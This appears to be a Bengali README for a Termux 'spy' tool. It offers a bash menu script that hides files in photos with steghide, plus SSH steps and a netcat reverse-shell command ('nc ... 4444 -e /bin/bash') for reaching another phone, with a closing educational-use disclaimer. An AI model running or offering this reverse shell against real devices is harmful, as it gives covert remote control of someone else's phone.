# photo_file_marge_spy

এটি যদি সম্পূর্ণভাবে **Termux** এর জন্য তৈরি করতে চান, তাহলে আমাদের কিছু প্রাথমিক কাজের দিকে নজর দিতে হবে। **Termux** একটি Linux-like পরিবেশ এবং এটি CLI (Command Line Interface) এর মাধ্যমে পরিচালিত হয়, যেখানে আপনি সহজে সিস্টেম কমান্ড রান করতে পারেন।

এখানে আপনার জন্য সম্পূর্ণ একটি **Termux টুল** তৈরি করা হবে যা **ফটোতে ফাইল লুকানো এবং বের করা** এবং **রিমোট এক্সেসের জন্য SSH বা রিভার্স শেল** ব্যবহারের জন্য কাজ করবে।

### টুলের ফিচার:

1. **ফটোতে ফাইল লুকানো এবং বের করা**: স্টেগানোগ্রাফি টুল ব্যবহার করে ফটোতে ফাইল লুকানো ও বের করার জন্য সরল ইন্টারফেস।
2. **রিমোট এক্সেস শেয়ারিং (SSH/RAT)**: SSH এর মাধ্যমে এক মোবাইলের Termux থেকে অন্য মোবাইলে এক্সেস পাঠানো।

এখানে আমরা **স্টেগানোগ্রাফি** (ফটোতে ফাইল লুকানো) এবং **রিভার্স শেল/SSH** এক্সেস সম্পর্কিত টুলটি প্রস্তুত করব।

### ১. Termux টুল সেটআপ:

এটি সম্পূর্ণ **Termux** এর মধ্যে কাজ করবে, তাই প্রথমে আপনার ডিভাইসে **Termux** ইনস্টল করতে হবে। 

**Termux** ইনস্টল না করা থাকলে:

```bash
pkg update
pkg upgrade
pkg install git
pkg install bash
```

### ২. ফটোতে ফাইল লুকানো ও বের করার জন্য স্ক্রিপ্ট:

আমরা `steghide` ব্যবহার করব, যা Termux-এ ইনস্টল করা যায় এবং ফটোতে ফাইল লুকানো ও বের করার কাজ করবে।

#### Step 1: `steghide` ইনস্টল করুন:

```bash
pkg install steghide
```

#### Step 2: স্ক্রিপ্ট তৈরি:

```bash
#!/bin/bash

clear
echo -e "\e[1;34m======================================="
echo -e "\e[1;36mTermux StegTool - Professional Version"
echo -e "\e[1;34m======================================="
echo -e "\e[0m"

# মেনু প্রদর্শন
echo -e "\e[1;33mWelcome to StegTool! Choose an option:"
echo -e "1. Hide a file inside an image"
echo -e "2. Extract a hidden file from an image"
echo -e "3. Exit"
echo -e "\e[0m"
echo -n "Please select an option (1/2/3): "

# অপশন ইনপুট
read option

# ফাইল লুকানোর জন্য অপশন 1
if [ "$option" -eq 1 ]; then
    echo -e "\n\e[1;32mYou chose to hide a file inside an image!\e[0m"
    echo -n "Enter the image file name (e.g., input.jpg): "
    read imgfile
    echo -n "Enter the file to hide (e.g., secret.txt): "
    read secretfile
    
    if [ -f "$imgfile" ] && [ -f "$secretfile" ]; then
        steghide embed -cf "$imgfile" -ef "$secretfile" > /dev/null 2>&1
        echo -e "\n\e[1;32mFile successfully hidden inside $imgfile!\e[0m"
    else
        echo -e "\n\e[1;31mError: One or both files do not exist. Please try again.\e[0m"
    fi

# ফাইল বের করার জন্য অপশন 2
elif [ "$option" -eq 2 ]; then
    echo -e "\n\e[1;32mYou chose to extract a hidden file from an image!\e[0m"
    echo -n "Enter the image file name (e.g., input.jpg): "
    read imgfile
    
    if [ -f "$imgfile" ]; then
        steghide extract -sf "$imgfile" > /dev/null 2>&1
        echo -e "\n\e[1;32mFile successfully extracted from $imgfile!\e[0m"
    else
        echo -e "\n\e[1;31mError: The image file does not exist. Please try again.\e[0m"
    fi

# অপশন 3: Exit
elif [ "$option" -eq 3 ]; then
    echo -e "\n\e[1;33mExiting StegTool. Goodbye!\e[0m"
    exit 0
else
    echo -e "\n\e[1;31mInvalid option selected. Please choose a valid option.\e[0m"
fi
```

#### স্ক্রিপ্টের ব্যাখ্যা:
- **স্টেগানোগ্রাফি (Steganography)**: এটি ছবির ভিতরে ফাইল লুকাতে এবং বের করতে সাহায্য করবে।
- **ব্যবহারকারী ইন্টারফেস**: CLI ইন্টারফেস সুন্দরভাবে ডিজাইন করা হয়েছে যাতে এটি দেখতে পরিষ্কার ও ব্যবহারযোগ্য হয়।

### ৩. রিভার্স শেল বা SSH এক্সেস:

#### রিভার্স শেল: 

এটি ব্যবহার করে আপনি এক মোবাইলের **Termux** থেকে অন্য মোবাইলের **Termux**-এ এক্সেস পাঠাতে পারবেন।

**প্রথম মোবাইলে (SSH server)**:

```bash
pkg install openssh
sshd
```

এটি SSH সার্ভার চালু করবে। এরপর আপনার **IP অ্যাড্রেস** নোট করুন:

```bash
ifconfig
```

#### দ্বিতীয় মোবাইলে (SSH client):

```bash
pkg install openssh
ssh username@<first_mobile_ip>
```

এখন দ্বিতীয় মোবাইল থেকে প্রথম মোবাইলের **Termux** তে এক্সেস চলে আসবে। আপনি এখানে ফাইল চালাতে বা অন্যান্য কাজ করতে পারবেন।

#### রিভার্স শেল:

প্রথম মোবাইলে `nc` ব্যবহার করে লিসেনিং চালু করুন:

```bash
nc -lvp 4444
```

এখন, দ্বিতীয় মোবাইলে নিচের কমান্ড ব্যবহার করে রিভার্স শেল চালান:

```bash
nc <first_mobile_ip> 4444 -e /bin/bash
```

এটি প্রথম মোবাইলের Termux থেকে দ্বিতীয় মোবাইলের Termux তে শেল এক্সেস প্রদান করবে।

---

### নিরাপত্তা ও ব্যবহার:
এই টুল শুধুমাত্র **শিক্ষামূলক উদ্দেশ্যে** তৈরি করা হয়েছে। আপনি যদি এটি ব্যবহার করেন, তাহলে আপনি অবশ্যই ব্যক্তিগত নিরাপত্তা এবং আইনি বিষয়গুলি মাথায় রাখবেন। অন্যদের ডিভাইসে অনুমতি ছাড়া এটি ব্যবহার না করার জন্য সতর্ক থাকুন।

এটি **Termux**-এ সম্পূর্ণভাবে কাজ করবে এবং আপনি আরও উন্নতি করতে পারবেন এতে নতুন ফিচার যেমন লগিং, ফাইল কাস্টমাইজেশন বা GUI ইন্টারফেস যোগ করতে।
